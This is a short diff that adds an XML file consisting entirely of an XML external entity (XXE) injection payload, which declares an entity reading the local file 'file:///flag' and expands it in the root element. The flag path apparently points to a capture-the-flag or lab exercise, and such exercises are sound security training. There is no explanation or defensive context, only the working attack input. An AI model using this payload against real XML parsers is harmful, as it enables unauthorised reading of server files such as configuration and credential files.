@@ -1,0 +1,4 @@
+<!DOCTYPE hello[
+<!ENTITY xxe SYSTEM "file:///flag">
+]>
+<root>&xxe;</root>
